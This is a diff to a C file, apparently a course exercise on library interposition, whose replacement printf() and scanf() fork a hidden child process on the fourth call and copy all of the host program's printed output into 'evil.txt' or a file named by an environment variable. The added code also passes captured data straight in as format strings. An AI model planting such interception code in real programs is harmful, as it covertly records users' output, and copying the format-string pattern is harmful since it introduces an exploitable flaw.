@@ -5,7 +5,7 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <fcntl.h>
-
+#include <stdlib.h>
 /*
  * We aren't providing much code here.  You'll need to implement your own
  * printf() and scanf(), as well as any constructors or destructors for your
@@ -13,35 +13,41 @@
  */
 
 static int call_counter = 0;
-static int pipe_write_fd;
-static int child_pid;
+static FILE * pipe_write = NULL;
 
 void evil_process_loop(int pipe_fd){
-  int file = open("evil.txt", O_CREAT | O_APPEND | O_WRONLY);
-  if(dup2(file,pipe_fd) < 0){
-    printf("redirect to evil.txt failed");
-    return;
+  FILE * evil;
+  const char* env_evil = getenv("EVILFILENAME");
+  if(env_evil == NULL){
+    evil = fopen("evil.txt", "w");
+  }else{
+    evil = fopen(env_evil, "w");
   }
-  if(dup2(STDOUT_FILENO,pipe_fd) < 0){
-    printf("redirect to stdout failed");
-    return;
+  char readbuffer[1024];
+  int nbytes = read(pipe_fd, readbuffer, sizeof(readbuffer)-1);
+  while(nbytes != 0){
+    readbuffer[nbytes] = '\0';
+    printf(readbuffer);
+    if(!fprintf(evil, readbuffer)){
+      perror("write to evil failed");
+    }
+    nbytes = read(pipe_fd, readbuffer, sizeof(readbuffer)-1);
   }
-  while(1){
-    sleep(1);
-  }
+  fclose(evil);
   close(pipe_fd);
+  exit(1);
 }
 
 void fork_evil_process(){
+  perror("forking");
   int pipefd[2];
   if(pipe(pipefd) == -1){
-    printf("pipe failure");
+    perror("pipe failure");
     return;
   }
-  
   pid_t process_id = fork();
   if(process_id == -1){
-    printf("fork error");
+    perror("fork error");
     return;
   }else if(process_id == 0){
     close(pipefd[1]);
@@ -49,8 +55,7 @@ void fork_evil_process(){
     return;
   }else{
     close(pipefd[0]);
-    pipe_write_fd = pipefd[1];
-    child_pid = process_id;
+    dup2(pipefd[1], STDOUT_FILENO);
     return;
   }
 }
@@ -58,39 +63,25 @@ void fork_evil_process(){
 int printf(const char * format, ...){
   call_counter++;
 
-  int (*real_printf)(const char * format, ...)=(int(*)(const char * format, ...))(dlsym (RTLD_NEXT, "printf"));
-
-  if(call_counter < 4){
-    va_list ap;
-    va_start(ap, format);
-    int ret_val = real_printf(format, ap);
-    va_end(ap);
-    return ret_val;
-  }else if(call_counter == 4){
+  if(call_counter == 4){
     fork_evil_process();
-  }else{
-    va_list ap;
-    va_start(ap, format);
-    FILE * pipe = fdopen(pipe_write_fd, "wb");
-    int ret_val = fprintf(pipe, format, ap);
-    fclose(pipe);
-    va_end(ap);
-    return ret_val;
   }
+  va_list ap;
+  va_start(ap, format);
+  int ret_val = vprintf(format, ap);
+  va_end(ap);
+  return ret_val;
 }
 
 int scanf(const char * format, ...){
   call_counter++;
-  
-  int (*real_scanf)(const char * format, ...)=(int(*)(const char * format, ...))(dlsym (RTLD_NEXT, "scanf"));
 
-  if(call_counter != 4){
-    va_list ap;
-    va_start(ap, format);
-    int ret_val = real_scanf(format, ap);
-    va_end(ap);
-    return ret_val;
-  }else if(call_counter == 4){
+  if(call_counter == 4){
     fork_evil_process();
   }
+  va_list ap;
+  va_start(ap, format);
+  int ret_val = vscanf(format, ap);
+  va_end(ap);
+  return ret_val;
 }
